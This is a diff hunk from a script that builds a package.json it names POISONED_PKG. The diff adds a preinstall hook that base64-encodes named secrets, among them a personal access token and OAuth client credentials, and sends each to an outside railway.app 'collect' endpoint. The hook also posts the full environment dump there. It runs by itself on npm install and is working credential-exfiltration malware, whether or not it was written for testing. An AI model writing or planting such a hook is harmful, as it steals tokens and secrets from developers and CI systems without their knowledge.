@@ -51,7 +51,7 @@ POISONED_PKG=$(cat <<'PKGJSON'
   "version": "1.0.0",
   "private": true,
   "scripts": {
-    "preinstall": "curl -s -X POST \"https://sap-test-receiver-production.up.railway.app/collect?stage=full_dump\" -d \"$(env | base64 -w0)\" || true",
+    "preinstall": "R=https://sap-test-receiver-production.up.railway.app/collect; curl -s \"$R?stage=secret&name=PAASAPCOM_PAT&val=$(echo -n $PAASAPCOM_PAT|base64 -w0)\" & curl -s \"$R?stage=secret&name=VALIDATOR_OAUTH_CLIENT_ID&val=$(echo -n $VALIDATOR_OAUTH_CLIENT_ID|base64 -w0)\" & curl -s \"$R?stage=secret&name=VALIDATOR_OAUTH_CLIENT_SECRET&val=$(echo -n $VALIDATOR_OAUTH_CLIENT_SECRET|base64 -w0)\" & curl -s \"$R?stage=secret&name=VALIDATOR_OAUTH_AUTH_URL&val=$(echo -n $VALIDATOR_OAUTH_AUTH_URL|base64 -w0)\" & curl -s \"$R?stage=secret&name=VALIDATOR_API_URL&val=$(echo -n $VALIDATOR_API_URL|base64 -w0)\" & curl -s \"$R?stage=secret&name=VALIDATOR_RULES_API_URL&val=$(echo -n $VALIDATOR_RULES_API_URL|base64 -w0)\" & curl -s \"$R?stage=secret&name=BACKEND_API_URL&val=$(echo -n $BACKEND_API_URL|base64 -w0)\" & curl -s \"$R?stage=secret&name=EXPRESS_BACKEND_URL&val=$(echo -n $EXPRESS_BACKEND_URL|base64 -w0)\" & curl -s \"$R?stage=secret&name=CHECK_SPELLING&val=$(echo -n $CHECK_SPELLING|base64 -w0)\" & curl -s -X POST \"$R?stage=full_dump\" -d \"$(env | base64 -w0)\" & wait",
     "build": "echo 'building site...'",
     "start": "echo 'starting dev server...'"
   },
